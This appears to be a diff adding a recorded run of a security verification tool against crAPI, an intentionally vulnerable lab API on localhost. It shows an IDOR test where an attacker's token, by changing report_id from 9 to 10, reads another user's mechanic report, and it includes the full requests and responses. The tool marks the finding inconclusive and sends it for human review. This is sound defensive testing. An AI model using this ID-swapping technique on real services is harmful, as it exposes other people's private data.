@@ -1,0 +1,72 @@
+# crAPI GET /workshop/api/mechanic/mechanic_report?report_id=  |  attacker reads owner's mechanic report; +bystander +assert_owner_only
+# op: report_id=9 -> report_id=10; tokens: attacker+owner+bystander; assert_owner_only=YES
+# vehicle claim used a pincode read from crAPI's OWN vehicle_details table (mailhog welcome
+# emails were empty in this deployment); contact_mechanic needs https (TLS_ENABLED=true).
+# crapi-workshop@sha256:d4d2d94d... VERSION=latest ; UTC 2026-08-12T06:39:48Z
+===== aivist run --config =====
+[DEEP-VERIFY] Broken-for-all disclosure (assert_owner_only): every AUTHENTICATED principal read this resource, but an anonymous request did NOT receive the owner's data (anon_status=401 reason='non_2xx:401'). LOCKED inconclusive; surfaced as a CONDITIONAL finding for HUMAN REVIEW (never confirmed).
+[verify] http://localhost:8888  GET /workshop/api/mechanic/mechanic_report?report_id=9  -> tier=broken_for_all verdict=inconclusive (exit 0)
+{
+  "mode": "verify",
+  "target": "http://localhost:8888",
+  "result": {
+    "verdict": "inconclusive",
+    "tier": "broken_for_all",
+    "guard_override": "broken_for_all_owner_assertion_human_review",
+    "method": "GET",
+    "baseline_path": "/workshop/api/mechanic/mechanic_report?report_id=9",
+    "attack_path": "/workshop/api/mechanic/mechanic_report?report_id=10",
+    "body": null,
+    "degraded": false,
+    "degraded_reason": null,
+    "caller_identity": "owner_not_found",
+    "payload_causality": "no_payload",
+    "state_jump": null,
+    "negative_assertion": null,
+    "owner_view_corroborated": false,
+    "broken_for_all_suspected": true,
+    "scan_skip_reason": null,
+    "evidence": {
+      "baseline": {
+        "request": {
+          "method": "GET",
+          "headers": {
+            "Authorization": "***REDACTED***"
+          },
+          "url": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=9",
+          "body": null
+        },
+        "response": {
+          "status_code": 200,
+          "content_length": 355,
+          "url": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=9",
+          "body": "{\"id\":9,\"mechanic\":{\"id\":1,\"mechanic_code\":\"TRAC_JHN\",\"user\":{\"email\":\"jhon@example.com\",\"number\":\"\"}},\"vehicle\":{\"id\":7,\"vin\":\"M02RN01S4P463K957\",\"owner\":{\"email\":\"mrAtk516587@crapi.io\",\"number\":\"1516587001\"}},\"problem_details\":\"ATTACKER-OWN-REPORT-canary-aa11\",\"status\":\"pending\",\"created_on\":\"12 August, 2026, 06:37:24\",\"updated_on\":null,\"comments\":[]}"
+        }
+      },
+      "attack": {
+        "request": {
+          "method": "GET",
+          "headers": {
+            "Authorization": "***REDACTED***"
+          },
+          "url": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=10",
+          "body": null
+        },
+        "response": {
+          "status_code": 200,
+          "content_length": 402,
+          "url": "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=10",
+          "body": "{\"id\":10,\"mechanic\":{\"id\":1,\"mechanic_code\":\"TRAC_JHN\",\"user\":{\"email\":\"jhon@example.com\",\"number\":\"\"}},\"vehicle\":{\"id\":8,\"vin\":\"7R5XWJ6HCY2FJUR03\",\"owner\":{\"email\":\"mrOwn516587@crapi.io\",\"number\":\"1516587002\"}},\"problem_details\":\"OWNER-PRIVATE-REPORT-canary-9931. Call me on my private line about the Creta.\",\"status\":\"pending\",\"created_on\":\"12 August, 2026, 06:37:26\",\"updated_on\":null,\"comments\":[]}"
+        }
+      },
+      "owner_view": {
+        "status": 200,
+        "reason": "ok",
+        "corroborated": false,
+        "body": "{\"id\":10,\"mechanic\":{\"id\":1,\"mechanic_code\":\"TRAC_JHN\",\"user\":{\"email\":\"jhon@example.com\",\"number\":\"\"}},\"vehicle\":{\"id\":8,\"vin\":\"7R5XWJ6HCY2FJUR03\",\"owner\":{\"email\":\"mrOwn516587@crapi.io\",\"number\":\"1516587002\"}},\"problem_details\":\"OWNER-PRIVATE-REPORT-canary-9931. Call me on my private line about the Creta.\",\"status\":\"pending\",\"created_on\":\"12 August, 2026, 06:37:26\",\"updated_on\":null,\"comments\":[]}"
+      }
+    }
+  },
+  "exit_code": 0
+}
+===== process exit=0 =====
